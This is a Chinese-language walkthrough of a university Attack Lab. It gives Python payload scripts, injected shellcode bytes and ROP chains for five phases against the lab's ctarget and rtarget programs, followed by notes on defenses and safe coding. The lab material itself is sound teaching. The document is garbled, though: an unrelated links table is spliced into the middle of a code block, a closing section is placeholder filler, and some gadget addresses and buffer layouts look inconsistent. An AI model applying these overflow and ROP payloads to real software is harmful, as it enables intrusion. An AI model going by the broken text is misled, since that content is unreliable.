# Lab 3: Attack Lab - 缓冲区溢出攻击实验

## 1. 实验目标

### 1.1 总体目标

Attack Lab通过缓冲区溢出攻击来学习程序安全漏洞。学生需要对目标程序进行代码注入攻击和ROP（Return-Oriented Programming）攻击。

| 目标 | 描述 |
|------|------|
| **缓冲区溢出** | 理解栈溢出原理 |
| **代码注入** | 在栈上注入并执行shellcode |
| **ROP攻击** | 绕过栈保护执行任意代码 |
| **安全意识** | 理解防御机制的重要性 |

### 1.2 攻击等级

```
┌─────────────────────────────────────────┐
│  Level 1: CTARGET - 代码注入攻击        │
│  - Phase 1: 简单缓冲区溢出              │
│  - Phase 2: 注入Shellcode               │
│  - Phase 3: 带参数的漏洞利用            │
├─────────────────────────────────────────┤
│  Level 2: RTARGET - ROP攻击             │
│  - Phase 4: 简单ROP攻击                 │
│  - Phase 5: 复杂ROP攻击                 │
└─────────────────────────────────────────┘
```

### 1.3 实验环境

```bash
# 目标程序
---

## 🔗 文档关联

### 核心关联
| 文档 | 关系类型 | 说明 |
|:-----|:---------|:-----|
| [内存管理](../../../01_Core_Knowledge_System/02_Core_Layer/02_Memory_Management.md) | 核心关联 | 内存管理基础 |
| [指针深度](../../../01_Core_Knowledge_System/02_Core_Layer/01_Pointer_Depth.md) | 核心关联 | 指针深度基础 |
| [并发编程](../../../03_System_Technology_Domains/14_Concurrency_Parallelism/README.md) | 核心关联 | 并发编程基础 |
| [数据类型](../../../01_Core_Knowledge_System/01_Basic_Layer/02_Data_Type_System.md) | 核心关联 | 数据类型基础 |
| [数组与指针](../../../01_Core_Knowledge_System/02_Core_Layer/05_Arrays_Pointers.md) | 核心关联 | 数组与指针基础 |

### 扩展阅读
| 文档 | 关系类型 | 说明 |
|:-----|:---------|:-----|
| [软件工程](../../../01_Core_Knowledge_System/05_Engineering_Layer/README.md) | 核心关联 | 软件工程基础 |
| [形式语义](../../../02_Formal_Semantics_and_Physics/README.md) | 核心关联 | 形式语义基础 |
| [系统技术](../../../03_System_Technology_Domains/README.md) | 核心关联 | 系统技术基础 |
| [工业场景](../../../04_Industrial_Scenarios/README.md) | 核心关联 | 工业场景基础 |
| [思维表征](../../../06_Thinking_Representation/README.md) | 核心关联 | 思维表征基础 |
ctarget - 代码注入版本（栈可执行）
rtarget - ROP版本（栈不可执行）

# 关键文件
cookie.txt    - 你的唯一cookie值
farm.c        - ROP gadget来源
hex2raw       - 转换工具
```

---

## 2. 背景知识

### 2.1 x86-64栈结构

```
高地址
┌─────────────────┐
│   返回地址      │ ← %rbp + 8
├─────────────────┤
│   保存的%rbp    │ ← %rbp
├─────────────────┤
│   局部变量      │
│   缓冲区        │ ← %rsp
│     ...         │
├─────────────────┤
│   参数构建区    │
└─────────────────┘
低地址
```

### 2.2 缓冲区溢出原理

```c
void vulnerable_function() {
    char buffer[80];           // 栈上缓冲区
    gets(buffer);              // 不检查边界！
    // 如果输入超过80字节，会覆盖返回地址
}
```

```
正常栈布局:          溢出后:
┌─────────────┐      ┌─────────────┐
│  返回地址   │      │  shellcode  │ ← 指向恶意代码
├─────────────┤      │    地址     │
│  保存%rbp   │      ├─────────────┤
├─────────────┤      │  nop sled   │
│             │      ├─────────────┤
│   buffer    │      │             │
│   [80字节]  │      │   buffer    │
│             │      │  [填充数据] │
└─────────────┘      └─────────────┘
```

### 2.3 调用约定回顾

```asm
; 参数传递
%rdi - 参数1
%rsi - 参数2
%rdx - 参数3
%rcx - 参数4
%r8  - 参数5
%r9  - 参数6

; 函数入口
push %rbp
mov %rsp, %rbp
sub $0xN, %rsp    ; 分配局部变量空间

; 函数返回
leave             ; mov %rbp, %rsp; pop %rbp
ret               ; pop %rip
```

### 2.4 ROP攻击原理

当栈不可执行时，无法直接注入代码。ROP利用程序自身已有的代码片段（gadget）：

```
正常返回:              ROP链:
┌─────────────┐        ┌─────────────┐
│  gadget1    │ ← %rsp │  gadget1    │ ← %rsp
│   地址      │        │   地址      │
├─────────────┤        ├─────────────┤
│  gadget2    │        │  参数/数据  │
│   地址      │        ├─────────────┤
├─────────────┤        │  gadget2    │
│  gadget3    │        │   地址      │
│   地址      │        ├─────────────┤
└─────────────┘        └─────────────┘

gadget1执行后ret会跳转到gadget2，依此类推
```

---

## 3. CTARGET攻击方案

### 3.1 Phase 1: 简单缓冲区溢出

#### 目标

覆盖返回地址，使程序执行`touch1`函数。

#### 分析

```bash
# 查看getbuf函数
gdb ctarget
disas getbuf

# 找到返回地址位置
# getbuf栈帧大小：0x28 (40字节)
```

```asm
00000000004017a8 <getbuf>:
  4017a8:   48 83 ec 28             sub    $0x28,%rsp    ; 分配40字节
  4017ac:   48 89 e7                mov    %rsp,%rdi     ; 缓冲区地址
  4017af:   e8 8c 02 00 00          callq  401a40 <Gets> ; 读取输入
  4017b4:   b8 01 00 00 00          mov    $0x1,%eax
  4017b9:   48 83 c4 28             add    $0x28,%rsp
  4017bd:   c3                      retq
```

#### 攻击策略

```
缓冲区布局:
┌─────────────────────────┐
│   40字节填充数据        │  ← 任意字符
├─────────────────────────┤
│   touch1地址(8字节)     │  ← 0x4017c0
└─────────────────────────┘
```

#### 攻击代码

```python
# phase1.py
import sys

# 40字节填充 + touch1地址
touch1_addr = 0x4017c0

payload = b'A' * 40
payload += touch1_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
```

```bash
./hex2raw < phase1.txt > raw-phase1.txt
./ctarget -q < raw-phase1.txt
```

#### 十六进制输入

```
00 00 00 00 00 00 00 00  (40字节填充)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00  (touch1地址)
```

---

### 3.2 Phase 2: Shellcode注入

#### 目标

注入shellcode并执行，使`touch2`接收你的cookie作为参数。

#### Shellcode设计

```asm
; shellcode.s - 设置参数并调用touch2
movq    $0x59b997fa, %rdi    ; 设置参数为cookie
call    touch2               ; 调用touch2

; 或者直接跳转到touch2
movq    $0x59b997fa, %rdi
pushq   $0x4017ec            ; touch2地址
ret
```

#### 机器码生成

```bash
# 编译并提取机器码
gcc -c shellcode.s
objdump -d shellcode.o

# 得到的机器码:
# 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
```

#### 攻击策略

```
缓冲区布局:
┌─────────────────────────┐
│   nop sled (填充)       │  ← 多个0x90
├─────────────────────────┤
│   shellcode             │  ← 设置rdi并跳转到touch2
├─────────────────────────┤
│   返回地址 = 缓冲区地址  │  ← 指向nop sled
└─────────────────────────┘
```

#### 攻击代码

```python
# phase2.py
import sys

# 获取缓冲区地址（通过gdb确定或尝试）
buffer_addr = 0x5561dc78  # 示例地址，实际需要调试确定

# Shellcode: mov $cookie, %rdi; push $touch2; ret
shellcode = bytes([
    0x48, 0xc7, 0xc7, 0xfa, 0x97, 0xb9, 0x59,  # mov $0x59b997fa, %rdi
    0x68, 0xec, 0x17, 0x40, 0x00,               # push $0x4017ec
    0xc3                                         # ret
])

# nop sled
nop_sled = b'\x90' * (40 - len(shellcode) - 8)

payload = nop_sled + shellcode
payload += buffer_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
```

#### 获取栈地址

```bash
gdb ctarget
break getbuf
run -q
# 查看栈地址
print/x $rsp
# 或
x/x $rsp
```

---

### 3.3 Phase 3: 带字符串参数的攻击

#### 目标

调用`touch3`，传入一个与你的cookie相等的字符串表示。

#### 挑战

- `touch3`接收字符串指针作为参数
- 字符串需要存储在可访问的内存中
- 栈地址在每次运行时可能变化

#### 策略

```
缓冲区布局:
┌─────────────────────────┐ 高地址
│   返回地址              │  ← 指向shellcode开始
├─────────────────────────┤
│   shellcode             │  ← 设置rdi为字符串地址，调用touch3
├─────────────────────────┤
│   nop sled / 填充       │
├─────────────────────────┤
│   cookie字符串          │  ← "59b997fa\0"
└─────────────────────────┘ 低地址 = %rsp

shellcode需要将%rdi设置为字符串地址（%rsp + offset）
```

#### Shellcode

```asm
# phase3_shellcode.s
leaq    0x20(%rsp), %rdi     # 计算字符串地址（相对rsp）
movq    $0x4018fa, %rax      # touch3地址
jmp     *%rax

# 或者使用call/ret技巧
leaq    0x20(%rsp), %rdi
pushq   $0x4018fa
ret
```

#### 攻击代码

```python
# phase3.py
import sys

buffer_addr = 0x5561dc78  # 需要根据实际调整
cookie_str = b"59b997fa\x00"
touch3_addr = 0x4018fa

# Shellcode: lea string_addr(%rsp), %rdi; push touch3; ret
shellcode = bytes([
    0x48, 0x8d, 0x7c, 0x24, 0x20,  # lea 0x20(%rsp), %rdi
    0x68, 0xfa, 0x18, 0x40, 0x00,  # push $0x4018fa
    0xc3                            # ret
])

# 计算布局
offset_to_string = 40 - len(shellcode) - len(cookie_str)

payload = b'\x90' * offset_to_string
payload += shellcode
payload += cookie_str
payload += buffer_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
```

---

## 4. RTARGET攻击方案

### 4.1 Phase 4: 简单ROP攻击

#### 目标

使用ROP调用`touch2`，参数为你的cookie。

#### 可用Gadget（来自farm.c）

```asm
# 从start_farm到end_farm之间的代码片段

# 设置寄存器的gadget示例:
popq %rax          ; 58 c3
movq %rax, %rdi    ; 48 89 c7 c3
movl %eax, %edi    ; 89 c7 c3
popq %rdi          ; 5f c3
ret                ; c3
```

#### 查找Gadget

```bash
# 使用objdump查找gadgets
objdump -d rtarget > rtarget.asm

# 搜索有用的指令序列
grep -E "(pop|mov|ret)" rtarget.asm

# 常见gadget位置（示例）
0x4019ab: popq %rax; ret
0x4019a2: movq %rax, %rdi; ret
```

#### ROP链设计

```
ROP链布局:
┌─────────────────────────┐
│   填充 (40字节)         │
├─────────────────────────┤
│   popq %rax地址         │  ← gadget1: 弹出cookie到rax
├─────────────────────────┤
│   cookie值              │
├─────────────────────────┤
│   movq %rax,%rdi地址    │  ← gadget2: rax -> rdi
├─────────────────────────┤
│   touch2地址            │  ← 目标函数
└─────────────────────────┘
```

#### 攻击代码

```python
# phase4.py
import sys

# Gadget地址（需要根据实际反汇编确定）
pop_rax_addr = 0x4019ab
mov_rax_rdi_addr = 0x4019a2
touch2_addr = 0x4017ec
cookie = 0x59b997fa

payload = b'A' * 40
payload += pop_rax_addr.to_bytes(8, 'little')
payload += cookie.to_bytes(8, 'little')
payload += mov_rax_rdi_addr.to_bytes(8, 'little')
payload += touch2_addr.to_bytes(8, 'little')

sys.stdout.buffer.write(payload)
```

---

### 4.2 Phase 5: 复杂ROP攻击

#### 目标

使用ROP调用`touch3`，传入cookie字符串。

#### 挑战

- 需要构建字符串指针
- 可能需要多次内存操作
- 使用更复杂的gadget组合

#### 策略

1. 在栈上放置cookie字符串
2. 计算字符串的栈地址
3. 将地址放入%rdi
4. 调用touch3

#### ROP链

```
栈布局:
┌─────────────────────────┐
│   填充 (40字节)         │
├─────────────────────────┤
│   popq %rax             │  ← 弹出栈偏移量
├─────────────────────────┤
│   偏移量 (如0x28)       │
├─────────────────────────┤
│   movq %rsp, %rbx       │  ← 获取当前栈指针
│   ret                   │
├─────────────────────────┤
│   addq %rax, %rbx       │  ← rbx = rsp + 偏移量
│   ret                   │
├─────────────────────────┤
│   movq %rbx, %rdi       │  ← rdi = 字符串地址
│   ret                   │
├─────────────────────────┤
│   touch3地址            │
├─────────────────────────┤
│   cookie字符串          │  ← "59b997fa\0"
└─────────────────────────┘
```

#### 查找特殊Gadget

```asm
; 从farm.c中可能找到:
add_xy:
    lea (%rdi,%rsi,1),%rax  ; rax = rdi + rsi
    ret

; 组合使用:
; 1. mov %rsp, %rdi
; 2. pop %rsi (偏移量)
; 3. call add_xy (rax = 字符串地址)
; 4. mov %rax, %rdi
; 5. call touch3
```

#### 攻击代码

```python
# phase5.py
import sys

# Gadget地址（需要根据实际farm.c确定）
pop_rdi = 0x4019a3
pop_rsi = 0x4019a5
mov_rsp_rdi = 0x4019d6
add_rsi_rdi = 0x4019d8
mov_rax_rdi = 0x4019a2
touch3_addr = 0x4018fa

cookie_str = b"59b997fa\x00"
string_offset = 0x38  # 字符串到当前rsp的偏移

payload = b'A' * 40

# 将rsp存入rdi
payload += mov_rsp_rdi.to_bytes(8, 'little')

# 弹出偏移量到rsi
payload += pop_rsi.to_bytes(8, 'little')
payload += string_offset.to_bytes(8, 'little')

# rax = rsp + offset (字符串地址)
payload += add_rsi_rdi.to_bytes(8, 'little')

# rdi = rax
payload += mov_rax_rdi.to_bytes(8, 'little')

# 调用touch3
payload += touch3_addr.to_bytes(8, 'little')

# cookie字符串
payload += cookie_str

sys.stdout.buffer.write(payload)
```

---

## 5. 防御机制

### 5.1 栈保护技术

| 技术 | 描述 | 对抗方法 |
|------|------|---------|
| Stack Canary | 栈帧插入校验值 | 信息泄露 |
| NX/DEP | 栈不可执行 | ROP/JOP |
| ASLR | 地址随机化 | 信息泄露/暴力破解 |
| RELRO | GOT表只读 | 其他方法 |
| FORTIFY_SOURCE | 检查缓冲区操作 | 寻找其他漏洞 |

### 5.2 安全编程实践

```c
// 危险函数替代
gets()      → fgets(buf, sizeof(buf), stdin)
strcpy()    → strncpy()
strcat()    → strncat()
sprintf()   → snprintf()

// 使用安全编译选项
// gcc -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wformat-security
```

---

## 6. 工具使用

### 6.1 hex2raw

```bash
# 将十六进制文本转换为原始字节
./hex2raw < exploit.txt > raw-exploit.txt

# 直接测试
./hex2raw < exploit.txt | ./ctarget -q
```

### 6.2 GDB调试

```bash
gdb ctarget

# 设置断点
break getbuf

# 查看栈
x/20gx $rsp

# 单步跟踪
stepi

# 检查寄存器
info registers
```

### 6.3 objdump分析

```bash
# 反汇编
objdump -d ctarget > ctarget.asm

# 查找字符串
objdump -s -j .rodata ctarget

# 查看特定函数
objdump -d --start-address=0x4017a8 --stop-address=0x4017be ctarget
```

---

**创建日期**: 2026-03-19


---

## 深入理解

### 核心原理

深入探讨技术原理和实现细节。

### 实践应用

- 应用场景1
- 应用场景2
- 应用场景3

### 最佳实践

1. 理解基础概念
2. 掌握核心机制
3. 应用到实际项目

---

> **最后更新**: 2026-03-21
> **维护者**: AI Code Review
